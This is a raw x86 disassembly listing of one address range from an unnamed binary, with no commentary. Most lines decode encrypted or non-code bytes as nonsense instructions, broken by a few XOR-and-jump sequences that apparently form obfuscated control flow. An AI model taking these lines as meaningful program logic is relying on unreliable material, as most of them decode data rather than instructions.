  414fb0:	or     ecx,DWORD PTR [ebx+eiz*8]
  414fb3:	mov    edx,0xdb48e939
  414fb8:	inc    ebp
  414fb9:	pop    edx
  414fbb:	ins    DWORD PTR es:[edi],dx
  414fbc:	ja     0x414fb4
  414fbe:	aaa    
  414fbf:	pop    ds
  414fc0:	je     0x41502a
  414fc2:	icebp  
  414fc3:	out    0xe5,eax
  414fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc6:	outs   dx,DWORD PTR ds:[esi]
  414fc7:	jmp    0x414f7c
  414fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fca:	ins    BYTE PTR es:[edi],dx
  414fcb:	or     BYTE PTR [esi-0x78],0x3c
  414fcf:	jo     0x414f8f
  414fd1:	out    0x84,eax
  414fd3:	jb     0x41502e
  414fd5:	test   al,0x5
  414fd7:	imul   ah
  414fd9:	out    0x4e,al
  414fdb:	dec    esp
  414fdc:	dec    eax
  414fdd:	fdivp  st(3),st
  414fdf:	pop    edx
  414fe0:	jb     0x414fee
  414fe2:	inc    edi
  414fe3:	ins    BYTE PTR es:[edi],dx
  414fe4:	sub    ch,BYTE PTR [ebx+ebp*8-0x33072235]
  414feb:	or     esp,DWORD PTR [edi+0x58]
  414fee:	sar    bl,cl
  414ff0:	sbb    edx,DWORD PTR [ebx]
  414ff2:	cwde   
  414ff3:	(bad)  
  414ff4:	std    
  414ff5:	test   al,0xb4
  414ff7:	pop    eax
  414ff8:	scas   al,BYTE PTR es:[edi]
  414ff9:	pop    edi
  414ffa:	mov    DWORD PTR [edx+0x2de481ed],edx
  415000:	into   
  415001:	xchg   esp,eax
  415002:	push   edi
  415003:	aaa    
  415004:	sahf   
  415005:	mov    eax,ds:0x34c4554b
  41500a:	xchg   esi,eax
  41500b:	aaa    
  41500c:	xor    al,0xdd
  41500e:	push   ebx
  41500f:	jb     0x414fc7
  415011:	je     0x41508c
  415013:	xlat   BYTE PTR ds:[ebx]
  415014:	add    cl,BYTE PTR [edi-0x5947d751]
  41501a:	mov    ecx,DWORD PTR [esi]
  41501c:	test   DWORD PTR [esi],ecx
  41501e:	xor    al,0xf6
  415020:	rcr    eax,cl
  415022:	int3   
  415023:	jmp    0x414fab
  415025:	fucom  st(1)
  415027:	xchg   BYTE PTR ds:0x474167e5,bh
  41502d:	in     al,dx
  41502e:	mov    bh,0xfb
  415030:	int3   
  415031:	add    al,0x5d
  415033:	stos   BYTE PTR es:[edi],al
  415034:	cmp    BYTE PTR [edi],dh
  415036:	sub    DWORD PTR [edx],ecx
  415038:	lock mov dh,0xc7
  41503b:	push   ebx
  41503c:	mov    edi,0x3035f9c2
  415041:	icebp  
  415042:	pop    esp
  415043:	mov    edi,DWORD PTR ss:[edx]
  415046:	dec    ebp
  415047:	loope  0x414ff3
  415049:	mov    ah,0xea
  41504b:	outs   dx,DWORD PTR ds:[esi]
  41504c:	push   eax
  41504d:	xchg   BYTE PTR [esi],ch
  41504f:	dec    eax
  415050:	mov    WORD PTR [ecx],fs
  415052:	push   ebp
  415053:	fs fs jae 0x41503a
  415057:	or     esp,DWORD PTR ds:0x41d403e1
  41505d:	out    dx,eax
  41505e:	cmp    BYTE PTR [eax-0x7eba4d7f],bl
  415064:	and    BYTE PTR [ecx-0xce18604],dh
  41506a:	sbb    al,0xb9
  41506c:	jg     0x415021
  41506e:	out    0xa8,al
  415070:	xor    BYTE PTR [edx+esi*1+0x13],bh
  415074:	push   0xfffffff8
  415076:	jge    0x415012
  415078:	imul   ebx,DWORD PTR [ecx+0x38],0x37
  41507c:	jle    0x415046
  41507e:	jbe    0x415098
  415080:	mov    edx,0x725ed0f0
  415085:	jno    0x415046
  415087:	dec    esp
  415088:	lods   eax,DWORD PTR ds:[esi]
  415089:	leave  
  41508a:	loopne 0x41508c
  41508c:	pop    edx
  41508d:	scas   eax,DWORD PTR es:[edi]
  41508e:	mov    dl,BYTE PTR [edi+edi*8-0x3e]
  415092:	icebp  
  415093:	push   cs
  415094:	inc    esp
  415095:	mov    eax,ds:0x13f0d266
  41509a:	jb     0x4150f3
  41509c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41509d:	and    edx,DWORD PTR [ebp+0xca92c71]
  4150a3:	adc    eax,0x6629156d
  4150a8:	and    dh,bl
  4150aa:	xlat   BYTE PTR ds:[ebx]
  4150ab:	pusha  
  4150ac:	int    0x19
  4150ae:	stos   BYTE PTR es:[edi],al
  4150af:	mov    ch,dh
  4150b1:	xchg   edi,eax
  4150b2:	jg     0x415042
  4150b4:	inc    ebx
  4150b5:	sahf   
  4150b6:	jl     0x4150c4
  4150b8:	dec    ebp
  4150b9:	and    eax,0x5ce52314
  4150be:	jnp    0x4150a1
  4150c0:	rcr    DWORD PTR [ecx+eiz*2-0x9f0c654],0x73
  4150c8:	sub    esp,esp
  4150ca:	sbb    eax,0x46db49dd
  4150cf:	aas    
  4150d0:	push   esp
  4150d1:	mov    esi,0xce456a08
  4150d6:	mov    edx,DWORD PTR [esp-0x3dce9314]
  4150dd:	imul   ebx,DWORD PTR [edi-0x21],0x722b3689
  4150e4:	push   ebp
  4150e5:	leave  
  4150e6:	out    dx,eax
  4150e7:	loope  0x4150f5
  4150e9:	inc    eax
  4150ea:	jne    0x4150c3
  4150ec:	out    dx,al
  4150ed:	jo     0x4150d0
  4150ef:	cmp    al,BYTE PTR [esi]
  4150f1:	cmp    edi,DWORD PTR [edx+0x77]
  4150f4:	jmp    0x4150da
  4150f6:	sbb    BYTE PTR [ebp-0x14],ch
  4150f9:	call   0x4944:0x7292a677
  415100:	xor    al,0x3d
  415102:	mov    ds:0x8966484f,al
  415107:	or     ecx,DWORD PTR [esi+0x22]
  41510a:	sub    ch,dl
  41510c:	jle    0x4150c2
  41510e:	xor    edx,eax
  415110:	mov    dh,0x3a
  415112:	imul   eax,DWORD PTR ss:[ebp+0x64f20852],0xdeaea109
  41511d:	jbe    0x4150a1
  41511f:	push   es
  415120:	es mov dl,0x72
  415123:	pop    ds
  415124:	ds nop
  415126:	mov    edx,0x259b04a1
  41512b:	in     eax,0x10
  41512d:	pop    ebx
  41512e:	in     eax,0xa5
  415130:	lds    esi,FWORD PTR [ecx-0x714358e2]
  415136:	pop    ebx
  415137:	nop
  415138:	lea    ebp,[ecx+0x5e]
  41513b:	mov    ah,0x7d
  41513d:	and    eax,0x68b0b1e0
  415142:	mov    BYTE PTR [ebp-0x452a756c],dh
  415148:	inc    edx
  415149:	inc    esi
  41514a:	idiv   DWORD PTR [ebx+0x5e66f076]
  415150:	popf   
  415151:	hlt    
  415152:	inc    esp
  415153:	call   0x1cc600ac
  415158:	push   edx
  415159:	sti    
  41515a:	sub    DWORD PTR [edi-0x57],esi
  41515d:	popf   
  41515e:	push   esi
  41515f:	xchg   BYTE PTR [ecx-0x479d681c],bh
  415165:	cmp    dl,BYTE PTR [esi]
  415167:	xor    eax,0xf4e3232d
  41516c:	add    DWORD PTR [ecx+0x6f456b61],0x5
  415173:	scas   eax,DWORD PTR es:[edi]
  415174:	in     al,dx
  415175:	jb     0x415198
  415177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415178:	ds out 0xe9,al
  41517b:	sti    
  41517c:	mov    ds:0xe02bb646,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstcw WORD PTR [edx+0x22]
  4151a6:	ins    DWORD PTR es:[edi],dx
  4151a7:	(bad)  
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	add    DWORD PTR [edi-0x6805158b],edi
  4151b6:	outs   dx,BYTE PTR ds:[esi]
  4151b7:	data16 mov dh,0xed
  4151ba:	mov    eax,ds:0xa633c9e2
  4151bf:	adc    eax,0x62752510
  4151c4:	test   DWORD PTR ds:0x84de5ca,ebx
  4151ca:	addr16 call 0xeb36:0x3f6489b3
  4151d2:	and    cl,dh
  4151d4:	and    ch,dl
  4151d6:	mov    fs,WORD PTR [esi+0x7a]
  4151d9:	lock push eax
  4151db:	mov    edx,ebx
  4151dd:	add    DWORD PTR [eax+0x2b39cca3],0x3a11a7b8
  4151e7:	or     esi,DWORD PTR [edx+0x75c6bcab]
  4151ed:	xchg   esi,ebx
  4151ef:	mov    ch,0x2f
  4151f1:	mov    eax,ds:0x43f4f7be
  4151f6:	mov    edi,ebp
  4151f8:	js     0x41522f
  4151fa:	push   0x218d3080
  4151ff:	mov    esp,0xe7c2e789
  415204:	popa   
  415205:	or     cl,BYTE PTR [edi-0x1f]
  415208:	lea    ecx,[edi+0x59]
  41520b:	xchg   DWORD PTR [ebx+0x10],eax
  41520e:	fidivr DWORD PTR [edi+0x1f]
  415211:	xor    BYTE PTR [edx-0x3b],bl
  415214:	gs jmp 0x18f7:0xc61576d9
  41521c:	cmp    DWORD PTR [ecx],ecx
  41521e:	mov    esp,DWORD PTR [ebp-0x13f8ab5c]
  415224:	push   edx
  415225:	lods   al,BYTE PTR ds:[esi]
  415226:	jne    0x415283
  415228:	(bad)  
  415229:	mov    dl,0x9c
  41522b:	push   cs
  41522c:	xlat   BYTE PTR ds:[ebx]
  41522d:	(bad)  
  41522e:	sti    
  41522f:	out    0x32,eax
  415231:	pusha  
  415232:	or     DWORD PTR [ebp-0xe424425],ecx
  415238:	push   cs
  415239:	mov    edx,0xafc97eab
  41523e:	out    0xab,eax
  415240:	add    ecx,DWORD PTR [edx-0x5dac66b3]
  415246:	inc    ecx
  415247:	mov    dl,0xdd
  415249:	mov    dh,0x52
  41524b:	sbb    eax,0xb53b79a2
  415250:	mov    ecx,0xab9a9844
  415255:	jge    0x415224
  415257:	stos   BYTE PTR es:[edi],al
  415258:	mov    eax,ds:0xfa1d9671
  41525d:	iret   
  41525e:	adc    ah,BYTE PTR [ebx]
  415260:	out    0x2d,eax
  415262:	cli    
  415263:	(bad)  [esi-0x21de5911]
  415269:	xchg   ebp,eax
  41526a:	pop    ss
  41526b:	fidivr DWORD PTR [bx+0x13]
  41526f:	imul   edi,DWORD PTR [ebx+0x63a23b5d],0xffffffa7
  415276:	sub    eax,0x151820ba
  41527b:	inc    edi
  41527c:	cld    
  41527d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527e:	test   esi,ebp
  415280:	call   0x17b5:0xa958248d
  415287:	mov    ebx,0x40211910
  41528c:	xor    al,0x6b
  41528e:	push   ss
  41528f:	mov    esi,0xf8e0189
  415294:	mov    edi,0x8243ff53
  415299:	dec    esp
  41529a:	pop    edx
  41529b:	stos   DWORD PTR es:[edi],eax
  41529c:	adc    BYTE PTR [eax+ecx*4-0x72b1659e],ch
  4152a3:	sbb    al,0xdc
  4152a5:	xor    BYTE PTR [esi],al
  4152a7:	push   ss
  4152a8:	(bad)  
  4152a9:	test   al,0xbd
  4152ab:	jns    0x4152dc
  4152ad:	dec    edx
  4152ae:	outs   dx,DWORD PTR ds:[esi]
  4152af:	js     0x415307
  4152b1:	call   0xfbe0b152
  4152b6:	mov    esp,eax
  4152b8:	xor    BYTE PTR [eax],al
  4152ba:	cmp    eax,eax
  4152bc:	(bad)  
  4152bd:	push   ebp
  4152be:	enter  0xb8bf,0x54
  4152c2:	sub    BYTE PTR [ecx-0x4d78f455],ch
  4152c8:	xlat   BYTE PTR ds:[ebx]
  4152c9:	pushf  
  4152ca:	scas   al,BYTE PTR es:[edi]
  4152cb:	inc    esp
  4152cc:	sahf   
  4152cd:	pop    es
  4152ce:	(bad)  
  4152cf:	leave  
  4152d0:	les    eax,FWORD PTR [ebx-0x63ba85c2]
  4152d6:	mov    dh,0xf3
  4152d8:	jecxz  0x4152a3
  4152da:	sbb    cl,bl
  4152dc:	cs ss mov dl,0x81
  4152e0:	aaa    
  4152e1:	imul   ebp
  4152e3:	mov    ah,0x69
  4152e5:	mov    BYTE PTR [edx-0x2207b814],cl
  4152eb:	fs (bad) 
  4152ed:	xchg   esi,eax
  4152ee:	mov    al,ds:0xdf344fb5
  4152f3:	dec    esp
  4152f4:	icebp  
  4152f5:	xchg   DWORD PTR [ebp-0x79],ecx
  4152f8:	xchg   ecx,eax
  4152f9:	popa   
  4152fa:	push   esi
  4152fb:	retf   0x944e
  4152fe:	es push esi
  415300:	xor    edx,DWORD PTR [esp+edx*2+0x1]
  415304:	add    bl,cl
  415306:	jmp    0x415301
  415308:	mov    ecx,0xca7c43e7
  41530d:	xchg   ecx,eax
  41530e:	mov    ecx,DWORD PTR [esi-0x7a]
  415311:	mov    edx,0xe878a631
  415316:	mov    edi,0xb7eff712
  41531b:	adc    DWORD PTR [edx-0x3f],edi
  41531e:	loopne 0x415339
  415320:	rcl    DWORD PTR [ecx+0x15],1
  415323:	sbb    al,0x14
  415325:	mov    al,0x1
  415327:	jecxz  0x415351
  415329:	pop    ebx
  41532a:	ret    0xc349
  41532d:	or     bh,BYTE PTR [ebx]
  41532f:	(bad)  
  415330:	stos   BYTE PTR es:[edi],al
  415331:	mov    al,ds:0x69a8f9b2
  415336:	adc    BYTE PTR [edx+edi*4+0x64],dl
  41533a:	pop    esi
  41533b:	adc    DWORD PTR [edx+0x22284f60],ebx
  415341:	std    
  415342:	int    0x8e
  415344:	bound  esp,QWORD PTR [ecx]
  415346:	sar    DWORD PTR [eax-0x64],1
  415349:	(bad)  
  41534a:	fist   DWORD PTR [esi-0x20318d86]
  415350:	pop    esi
  415351:	fsub   DWORD PTR [ebx+0x78]
  415354:	jg     0x4153a8
  415356:	and    ah,BYTE PTR [ebp+0x52]
  415359:	ficomp WORD PTR [eax+0x23]
  41535c:	sub    BYTE PTR [ecx-0x21],dl
  41535f:	add    eax,0x35749ac
  415364:	(bad)  
  415365:	mov    ds:0x6317da0e,eax
  41536a:	dec    ebp
  41536b:	call   0xa5f99c81
  415370:	and    eax,0xda49d81e
  415375:	mov    ch,0xb3
  415377:	jmp    0x352f:0xc32520bf
  41537e:	int    0x32
  415380:	in     eax,dx
  415381:	jp     0x4153b9
  415383:	ins    BYTE PTR es:[di],dx
  415385:	sti    
  415386:	mov    al,ds:0x492b3049
  41538b:	fwait
  41538c:	jnp    0x41535c
  41538e:	inc    esi
  41538f:	mov    ebx,0xb368aea3
  415394:	in     eax,0x88
  415396:	mov    edx,0x95183f02
  41539b:	xchg   edx,eax
  41539c:	push   ebx
  41539d:	mov    bh,0xa1
  41539f:	jmp    0x785c467e
  4153a4:	mov    ebp,0xe39a8f70
  4153a9:	stos   DWORD PTR es:[edi],eax
  4153aa:	(bad)  
  4153ab:	fmul   QWORD PTR [edx+0x28807c7]
  4153b1:	mov    bl,0x78
  4153b3:	jmp    0x4153ea
  4153b5:	outs   dx,BYTE PTR ds:[esi]
  4153b6:	or     eax,DWORD PTR [eax-0x5568c633]
  4153bc:	ret    0x8e94
  4153bf:	les    esi,FWORD PTR [edx+0x789b5f12]
  4153c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153c6:	jmp    0x415353
  4153c8:	sub    DWORD PTR [esi],0x63
  4153cb:	inc    ebx
  4153cc:	and    cl,bh
  4153ce:	sbb    al,0xe1
  4153d0:	xchg   esi,eax
  4153d1:	xchg   bl,bl
  4153d3:	cs aad 0x14
  4153d6:	adc    eax,0x74a240a6
  4153db:	adc    DWORD PTR [ecx-0x34],edi
  4153de:	adc    cl,BYTE PTR [edi+0xb]
  4153e1:	jle    0x4153c9
  4153e3:	stos   BYTE PTR es:[edi],al
  4153e4:	sbb    edi,esi
  4153e6:	dec    esi
  4153e7:	ins    DWORD PTR es:[edi],dx
  4153e8:	sbb    al,0x89
  4153ea:	fwait
  4153eb:	mov    WORD PTR [edi-0x26964e33],ss
  4153f1:	js     0x415424
  4153f3:	inc    ebx
  4153f4:	pop    ss
  4153f5:	(bad)  [edi-0x42d22d93]
  4153fb:	jno    0x4153ff
  4153fd:	jns    0x4153f3
  4153ff:	dec    esp
  415400:	or     al,0x1
  415402:	arpl   WORD PTR [edi],si
  415404:	xor    DWORD PTR [edx+0x1eca9178],ebx
  41540a:	and    BYTE PTR [esi+0x7f],0xe3
  41540e:	loop   0x415390
  415410:	mov    ch,cl
  415412:	mov    ah,0x6e
  415414:	das    
  415415:	(bad)  
  415416:	div    BYTE PTR [ecx]
  415418:	gs mov edx,eax
  41541b:	jg     0x4153ee
  41541d:	push   esp
  41541e:	ins    DWORD PTR es:[edi],dx
  41541f:	mov    ah,0xcd
  415421:	cs pop ds
  415423:	stc    
  415424:	inc    edi
  415425:	pop    ebx
  415426:	mov    BYTE PTR [ebp-0x5051f338],dl
  41542c:	imul   ecx,eax,0x47
  41542f:	mov    esi,0x6554afff
  415434:	jae    0x415477
  415436:	push   0x5e4adb18
  41543b:	into   
  41543c:	inc    edi
  41543d:	fwait
  41543e:	pop    eax
  41543f:	xchg   edx,eax
  415440:	lods   al,BYTE PTR ds:[esi]
  415441:	or     dx,WORD PTR [ebp+0x24]
  415445:	add    DWORD PTR [ecx+0x60824f85],ebx
  41544b:	jmp    0x4154b7
  41544d:	mov    ebp,0xf00e69b0
  415452:	pushf  
  415453:	or     al,0x5b
  415455:	(bad)  
  415457:	xor    al,0xc7
  415459:	add    eax,0xcad7a392
  41545e:	aaa    
  41545f:	cmp    DWORD PTR [edi+0x58],edi
  415462:	cs jo  0x4153e6
  415465:	cmc    
  415466:	fs in  al,dx
  415468:	fmul   QWORD PTR [esi]
  41546a:	aaa    
  41546b:	and    esi,eax
  41546d:	xor    dl,BYTE PTR [esi+eax*1]
  415470:	pop    ds
  415471:	jl     0x415451
  415473:	pop    ds
  415474:	mov    eax,ds:0xc2034c0d
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x2
  4154c8:	jg     0x4154f7
  4154ca:	repz add bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x3f70707e
  4154d4:	xchg   ebx,eax
  4154d5:	mov    edx,0x6c421150
  4154da:	mov    edx,0xf1dadb0e
  4154df:	les    ebx,FWORD PTR [ebp+0x2ba7bd19]
  4154e5:	sti    
  4154e6:	push   0x64
  4154e8:	push   es
  4154e9:	and    al,0xd2
  4154eb:	and    ebp,DWORD PTR [esi]
  4154ed:	sbb    al,0x2c
  4154ef:	push   ebx
  4154f0:	les    esp,FWORD PTR [ebp-0x7c]
  4154f3:	inc    eax
  4154f4:	out    0xbd,eax
  4154f6:	mov    al,ds:0x972e8a22
  4154fb:	or     esi,0x29
  4154fe:	mov    esp,0x572eedb9
  415503:	in     al,dx
  415504:	inc    eax
  415505:	popa   
  415506:	mov    ah,0x14
  415508:	loopne 0x415554
  41550a:	bound  ebp,QWORD PTR [edx+eax*8]
  41550d:	clc    
  41550e:	and    esi,DWORD PTR [ebx+ecx*8]
  415511:	jmp    0xc07f2017
  415516:	call   0x6f17:0x255f77ab
  41551d:	popa   
  41551e:	shl    DWORD PTR [ebx-0x62],1
  415521:	fisttp QWORD PTR [ebp+0x7d]
  415524:	fwait
  415525:	jns    0x415569
  415527:	fld    TBYTE PTR [ebx-0x39]
  41552a:	das    
  41552b:	mov    BYTE PTR [eax+ebp*4],bl
  41552e:	aam    0xf
  415530:	hlt    
  415531:	push   0xffffff8c
  415533:	ja     0x41553a
  415535:	cs adc eax,0xb2bdcc4e
  41553b:	push   cs
  41553c:	shr    DWORD PTR [ebp+0x2846cfe2],cl
  415542:	sbb    bl,bh
  415544:	mov    ds:0x6b58f633,eax
  415549:	retf   
  41554a:	hlt    
  41554b:	nop
  41554c:	dec    ecx
  41554d:	(bad)
  415551:	adc    edi,DWORD PTR ds:0xd870d180
  415557:	push   cs
  415558:	inc    esi
  415559:	push   edx
  41555a:	pop    edi
  41555b:	push   cs
  41555c:	xchg   edx,eax
  41555d:	pusha  
  41555e:	xlat   BYTE PTR ds:[ebx]
  41555f:	pop    edi
  415560:	and    ebp,DWORD PTR [edi-0x4b02da08]
  415566:	inc    edx
  415567:	pushf  
  415568:	into   
  415569:	xchg   ebx,eax
  41556a:	je     0x4155d7
  41556c:	and    esi,esi
  41556e:	xchg   esp,eax
  41556f:	fsub   DWORD PTR [edi]
  415571:	leave  
  415572:	jmp    0xe816:0x33750bf5
  415579:	inc    esp
  41557a:	jge    0x415586
  41557c:	int    0xb1
  41557e:	xor    eax,0x757d5ad4
  415583:	das    
  415584:	jg     0x41553d
  415586:	pop    edi
  415587:	push   esi
  415588:	div    BYTE PTR [edi-0x71570086]
  41558e:	outs   dx,BYTE PTR ds:[esi]
  41558f:	sbb    al,bh
  415591:	push   edi
  415592:	das    
  415593:	mov    edx,0xda3faa52
  415598:	inc    edx
  415599:	stc    
  41559a:	aam    0x8c
  41559c:	and    ebp,esi
  41559e:	inc    ecx
  41559f:	push   eax
  4155a0:	and    eax,0x22822f48
  4155a5:	sar    DWORD PTR [ebx],1
  4155a7:	fldcw  WORD PTR [ebx]
  4155a9:	sar    BYTE PTR ds:0xd36803ae,0x28
  4155b0:	shl    BYTE PTR ds:0x7877c9a9,0x29
  4155b7:	xchg   esp,ebx
  4155b9:	push   ds
  4155ba:	mov    eax,ds:0x30fd9fc4
  4155bf:	(bad)  
  4155c0:	add    dh,ah
  4155c2:	and    ebx,0xafc6172a
  4155c8:	mov    ebp,cs
  4155ca:	mov    ecx,0x31b04dfc
  4155cf:	cld    
  4155d0:	xchg   ebp,eax
  4155d1:	adc    cl,BYTE PTR [eax+0x5d45c10f]
  4155d7:	adc    dh,al
  4155d9:	fnsave ds:[ebp+0xa]
  4155dd:	push   edx
  4155de:	call   0x1e781bcd
  4155e3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4155e5:	jmp    0x4155b2
  4155e7:	pop    esp
  4155e8:	pop    ebp
  4155e9:	das    
  4155ea:	add    DWORD PTR [eax-0x46a42685],esi
  4155f0:	push   eax
  4155f1:	jae    0x415648
  4155f3:	or     ebp,edx
  4155f5:	int3   
  4155f6:	xor    BYTE PTR [edi+0xe],ch
  4155f9:	popa   
  4155fa:	stos   BYTE PTR es:[edi],al
  4155fb:	aad    0x70
  4155fd:	cli    
  4155fe:	mov    eax,ds:0x3c5edeee
  415603:	js     0x415608
  415605:	jge    0x415675
  415607:	xchg   edx,eax
  415608:	xchg   BYTE PTR [esi],bl
  41560a:	jecxz  0x41558f
  41560c:	add    DWORD PTR [ecx-0x65],ebx
  41560f:	push   ss
  415610:	jle    0x41568d
  415612:	daa    
  415613:	sbb    al,0xac
  415615:	pop    ecx
  415616:	push   es
  415617:	loope  0x41566d
  415619:	stc    
  41561a:	xor    DWORD PTR [edi+0x6f],0xffffffab
  41561e:	imul   ecx
  415620:	push   esp
  415621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415622:	sar    BYTE PTR [eax-0x503bd990],1
  415628:	pop    ecx
  415629:	loope  0x41560c
  41562b:	fs (bad) 
  41562d:	lahf   
  41562e:	push   esi
  41562f:	xchg   esp,eax
  415630:	cmp    cl,ch
  415632:	xchg   ecx,eax
  415633:	xchg   DWORD PTR [ecx-0x8],eax
  415636:	retf   0x7a7e
  415639:	jp     0x4155d4
  41563b:	outs   dx,DWORD PTR ds:[esi]
  41563c:	ror    BYTE PTR [eax+edi*4],1
  41563f:	jmp    0x7aa8de1f
  415644:	jae    0x41561d
  415646:	push   edi
  415647:	rcl    ebx,cl
  415649:	mov    WORD PTR [ecx],ss
  41564b:	or     al,0x78
  41564d:	jp     0x41568a
  41564f:	scas   eax,DWORD PTR es:[edi]
  415650:	cmp    BYTE PTR [esi+edi*4],ch
  415653:	std    
  415654:	mov    ch,cl
  415656:	sbb    BYTE PTR [edx-0x6a],cl
  415659:	push   esp
  41565a:	mov    ecx,0xc87c523
  41565f:	(bad)
  415662:	test   BYTE PTR [edx+0x5c],al
  415665:	jb     0x4156a3
  415667:	cld    
  415668:	adc    bh,BYTE PTR [ebx+0x14d0c498]
  41566e:	xor    eax,0x3fdd7c8a
  415673:	jmp    0x41564c
  415675:	push   ecx
  415676:	enter  0x2aa7,0x9e
  41567a:	int    0x32
  41567c:	push   esp
  41567d:	ins    BYTE PTR es:[edi],dx
  41567e:	xchg   esi,eax
  41567f:	and    esp,DWORD PTR [edi+0x32]
  415682:	or     BYTE PTR [edi-0x75],al
  415685:	cwde   
  415686:	out    dx,eax
  415687:	xchg   ecx,eax
  415688:	rol    edi,cl
  41568a:	(bad)  
  41568c:	push   ebp
  41568d:	inc    eax
  41568e:	mov    dl,0xac
  415690:	adc    edx,0x1f6ec042
  415696:	in     eax,dx
  415697:	inc    esi
  415698:	(bad)  
  415699:	in     eax,0x4c
  41569b:	je     0x415681
  41569d:	aas    
  41569e:	add    esp,ebp
  4156a0:	outs   dx,BYTE PTR ds:[esi]
  4156a1:	outs   dx,DWORD PTR ds:[esi]
  4156a2:	jg     0x415649
  4156a4:	mov    ah,0x6a
  4156a6:	sbb    eax,0x90d62b1e
  4156ab:	and    BYTE PTR ds:0x10dfaa4d,bh
  4156b1:	dec    ecx
  4156b2:	xchg   ecx,eax
  4156b3:	push   esi
  4156b4:	pop    eax
  4156b5:	out    0x1b,eax
  4156b7:	sbb    bl,BYTE PTR [edi+edx*4+0x1d]
  4156bb:	fwait
  4156bc:	sub    eax,0x50166fc
  4156c1:	aad    0x57
  4156c3:	sub    eax,DWORD PTR [esi+0x4]
  4156c6:	cmp    eax,0xfe47b22e
  4156cb:	sub    eax,0xf3e6495c
  4156d0:	cmp    ebx,DWORD PTR [edi+0xf]
  4156d3:	popa   
  4156d4:	sbb    ecx,edi
  4156d6:	mov    al,0xe5
  4156d8:	and    DWORD PTR [edi+esi*8+0x4d],0xffffffbb
  4156dd:	ins    DWORD PTR es:[edi],dx
  4156de:	jge    0x4156d2
  4156e0:	inc    ebx
  4156e1:	pop    DWORD PTR [edx+0x5b4cc049]
  4156e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156e8:	js     0x415678
  4156ea:	or     al,0x6c
  4156ec:	out    0xc0,al
  4156ee:	sub    eax,0xc59f868e
  4156f3:	adc    eax,0x599fa6f3
  4156f8:	dec    eax
  4156f9:	(bad)  
  4156fa:	std    
  4156fb:	test   BYTE PTR [esi-0x3fae791f],dh
  415701:	or     BYTE PTR [eax],al
  415703:	adc    ah,BYTE PTR [edi-0x56]
  415706:	jns    0x415751
  415708:	or     dh,al
  41570a:	cld    
  41570b:	mov    BYTE PTR [ecx],cl
  41570d:	mov    cl,BYTE PTR [edi+ebx*8-0x53]
  415711:	popa   
  415712:	jbe    0x415787
  415714:	jp     0x4156e3
  415716:	fidiv  WORD PTR [edi+ebx*4-0x71]
  41571a:	loopne 0x41569f
  41571c:	stos   DWORD PTR es:[edi],eax
  41571d:	mov    ebp,eax
  41571f:	jo     0x415750
  415721:	cdq    
  415722:	test   eax,0x89c61c86
  415727:	xchg   esp,eax
  415728:	mov    ebp,eax
  41572a:	pusha  
  41572b:	xor    al,0x3b
  41572d:	pop    esi
  41572e:	inc    esp
  41572f:	(bad)  
  415730:	fld    TBYTE PTR [ecx+edx*4+0x77a7084e]
  415737:	(bad)  
  415738:	int    0xd3
  41573a:	fisttp DWORD PTR [ebx-0x3f]
  41573d:	and    BYTE PTR [esi],cl
  41573f:	hlt    
  415740:	lock and al,0x77
  415743:	int    0xfd
  415745:	fstp   DWORD PTR [edx]
  415747:	jmp    0x4156eb
  415749:	jno    0x4157be
  41574b:	pop    ss
  41574c:	cmp    BYTE PTR [ecx+0x32],dh
  41574f:	neg    al
  415751:	fistp  QWORD PTR [edi+0x34]
  415754:	sbb    al,BYTE PTR [edx+0x49]
  415757:	add    bh,BYTE PTR [edx-0x73]
  41575a:	in     al,dx
  41575b:	inc    edx
  41575c:	jmp    FWORD PTR [ebx+0x2740c463]
  415762:	sub    ecx,esi
  415764:	into   
  415765:	push   esi
  415766:	fnstenv ds:0x2a28de4
  41576c:	push   cs
  41576d:	scas   al,BYTE PTR es:[edi]
  41576e:	aas    
  41576f:	test   eax,0x68b9a8f3
  415774:	sbb    BYTE PTR [edx],bh
  415776:	shr    BYTE PTR [ebx+0xd],1
  415779:	xor    eax,edx
  41577b:	pop    eax
  41577c:	mov    edx,0x5cb9378f
  415781:	outs   dx,DWORD PTR ds:[esi]
  415782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415783:	push   es
  415784:	lock inc esi
  415786:	xchg   edx,eax
  415787:	sub    eax,DWORD PTR [esi-0x74a65187]
  41578d:	clc    
  41578e:	inc    edi
